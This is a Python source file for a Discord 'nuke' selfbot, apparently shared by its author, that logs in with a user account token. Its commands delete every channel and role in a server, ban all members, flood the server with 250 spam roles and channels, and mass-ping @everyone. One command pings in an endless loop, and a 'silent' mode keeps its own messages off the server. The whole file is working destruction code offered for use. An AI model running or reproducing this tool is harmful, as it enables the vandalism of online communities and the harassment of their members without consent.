import discord
from discord.ext import commands
from aiohttp import request
import random
import time
import os
import numpy
import string
import json

with open('config.json') as f:
    config = json.load(f)
version = "2"
token = config.get('token')
silent = config.get('silent')
prefix = config.get('prefix')
JumboPic = "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Nuclear_symbol.svg/1200px-Nuclear_symbol.svg.png"
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[1;94m', '\033[1;91m', '\33[1;97m', '\33[1;93m', '\033[1;35m', '\033[1;32m', '\033[0m'
helplog = ('''
[Destory] Deletes everything
[Ban_all] Bans all members
[Role_delete] Deletes all roles
[Role_spam] Spams roles
[Channel_delete] Deletes all channels
[Channel_spam] Spams channels
''')
client = commands.Bot(command_prefix = f'{prefix}', self_bot=True)
main = (f''' 

███╗   ██╗██╗   ██╗██╗  ██╗███████╗    ██████╗  ██████╗ ████████╗
████╗  ██║██║   ██║██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗╚══██╔══╝
██╔██╗ ██║██║   ██║█████╔╝ █████╗      ██████╔╝██║   ██║   ██║   
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝      ██╔══██╗██║   ██║   ██║   
██║ ╚████║╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝    ╚═╝   
                                                                 
By Jammy#4613
Version : {version}
Silent mode : {silent}
Type {prefix}help for commands
''')
@client.event
async def on_ready():
    print(main)
    print("[!]Bot online")
client.remove_command('help')

@client.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=ctx.author.color)
    embed.set_author(name="Nuke Bot / Made by Jammy#4613")
    embed.add_field(name="Destory", value="\nDeletes everything!", inline=False)
    embed.add_field(name="Ban_all", value="\nBans all users", inline=False)
    embed.add_field(name="Role_delete", value="\nDeletes all roles", inline=False)
    embed.add_field(name="Role_spam", value="\nSpams roles", inline=False)
    embed.add_field(name="Channel_delete", value="\nDeletes all channels", inline=False)
    embed.add_field(name="Channel_spam", value="\nDeletes all channels", inline=False)
    embed.add_field(name="Spam_ping", value="\nSpams a msg in all channels", inline=False)
    embed.add_field(name="Destroy_ping", value="\nSpams a msg in all channels infintly", inline=False)

    embed.set_thumbnail(url=JumboPic)
    if silent == 'off':
        await ctx.send(embed=embed)
    else:
        print(helplog)

@client.command()
async def channel_delete(ctx):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Deleting channels`")
    else:
        print("[!] Deleting channels")
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
@client.command()
async def spam_ping(ctx, *, message):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Spamming channels`")
    else:
        print("[!] Spamming channels")
    for channel in list(ctx.guild.channels):
        try:
            for _i in range(25):
                await channel.send(f"@everyone {message}")    
        except:
            pass
@client.command()
async def destroy_ping(ctx, *, message):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Spamming channels`")
    else:
        print("[!] Spamming channels")
    for channel in list(ctx.guild.channels):
        try:
            while True:
                for _i in range(25):
                    await channel.send(f"@everyone {message}")    
        except:
            pass
@client.command()
async def ban_all(ctx):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Banning all users`")
    else:
        print("[!] Banning all users")
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass   
@client.command()
async def role_delete(ctx):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Deleting all roles`")
    else:
        print("[!] Deleting all roles")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
@client.command()
async def role_spam(ctx, *, name):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Spamming roles`")
    else:
        print("[!] Spamming roles")
    for _i in range(250):
        await ctx.guild.create_role(name=f"{name}")
@client.command()
async def channel_spam(ctx, *, name):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"`Spamming channels`")
    else:
        print("[!] Spamming channels")
    for _i in range(250):
        await ctx.guild.create_text_channel(name=f"{name}")

@client.event
async def on_command_error(ctx, error):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"Command not found!", delete_after=3)
    else:
        print("[!] Command not found")

@client.command()
async def destroy(ctx):
    await ctx.message.delete()
    if silent == 'off':
        await ctx.send(f"Destorying everything")
    else:
        print("[!] Destorying everything")
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass 
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    for _i in range(250):
        await ctx.guild.create_role(name=f"Nuked-by-Jammy#4613")
    for _i in range(250):
        await ctx.guild.create_text_channel(name=f"Nuked-by-Jammy#4613")
    print("Attack finished")
client.run(token, bot=False)
